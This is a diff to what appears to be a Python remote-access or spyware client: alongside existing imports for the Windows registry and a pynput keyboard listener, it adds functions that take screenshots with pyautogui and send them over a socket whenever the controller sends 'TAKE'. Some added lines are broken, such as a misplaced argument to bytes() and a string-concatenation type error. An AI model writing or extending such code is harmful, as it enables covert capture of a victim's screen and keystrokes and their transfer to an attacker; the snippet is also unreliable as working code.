@@ -5,6 +5,7 @@ import winreg
 import time
 from io import BytesIO
 from pynput.keyboard import Key, Listener   
+import pyautogui
 
 BUFF_SIZE = 4096 
 
@@ -22,6 +23,38 @@ def recvall(sock):
         if data:
             break
     return data.decode().strip()
+
+def largerSend(sock, data):
+    print(len(str(data)) + "\n")
+    sock.sendall(bytes(str(len(data))),"utf8")
+    sock.sendall(data)
+
+def largerReceive(sock):
+    size = recvall(sock)
+
+def take(sock):
+    img = pyautogui.screenshot() 
+    fd = BytesIO()
+    img.save(fd, "png")
+    data = fd.getvalue()
+    print(data)
+    largerSend(sock, data)
+    print(1)
+    return
+
+def takepic(sock):
+    take(sock)
+    print(1)
+    while (True):
+        s = recvall(sock)
+        print(s)
+        if (s == "TAKE"):
+            take(sock)
+            print(1)
+        else:
+            break
+    return
+
 
 def shutdown(sock):
     try:
